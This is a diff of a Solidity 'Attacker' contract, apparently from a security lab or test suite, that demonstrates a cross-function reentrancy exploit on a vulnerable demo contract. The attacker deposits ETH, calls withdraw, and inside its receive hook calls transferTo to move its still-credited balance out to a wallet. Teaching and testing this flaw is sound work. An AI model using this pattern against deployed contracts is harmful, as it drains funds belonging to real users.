@@ -59,26 +59,26 @@ contract xFnReentrancy is ReentrancyGuard {
  */
 contract Attacker {
     xFnReentrancy target;
-    address payable wallet;
+    address payable public wallet;
 
 
-    constructor() {
-        target = new xFnReentrancy();
-        wallet = payable(msg.sender);
+    constructor(address _target, address _wallet) {
+        target = xFnReentrancy(_target);
+        wallet = payable(_wallet);
     }
 
 
     function exploit() external payable {
+        console2.log("\t[Attacker] Depositting %s ETH to victim", msg.value/1 ether);
         target.deposit{value: msg.value}();
         target.withdraw();
     }
 
 
     receive() external payable {
+        console2.log("\t[Attacker] Received %s ETH", msg.value/1 ether);
         uint256 amount = target.userBalance(address(this));
-        console.log("Malicious contract received %s ETH but their deposit is still %s ETH!", msg.value/1 ether, amount/1 ether);
-        target.transferTo(wallet, amount);
-        console.log("Deposit transfered internally to Mallory");        
+        target.transferTo(wallet, amount);       
     }
 
 
